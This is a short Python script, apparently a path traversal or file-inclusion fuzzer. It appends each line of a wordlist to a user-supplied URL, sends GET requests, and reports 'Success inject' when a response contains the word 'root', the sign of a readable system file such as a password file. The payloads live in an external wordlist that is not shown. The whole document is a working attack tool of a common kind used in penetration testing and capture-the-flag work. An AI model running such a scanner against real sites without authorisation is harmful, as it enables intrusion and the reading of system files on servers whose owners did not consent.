import requests
import re

BASEURL = input("URL : ")

with open("wordlist.txt", 'r') as file:
    for path in file:
        path = path.strip() 
        traversal = BASEURL + path
        getRequest = requests.get(url=traversal)

        if re.search(r"\broot\b", getRequest.text):
            print(f"Success inject {path}\n")
            print(f"Response: {getRequest.text}")
        else:
            print(f"Try payload {path}")
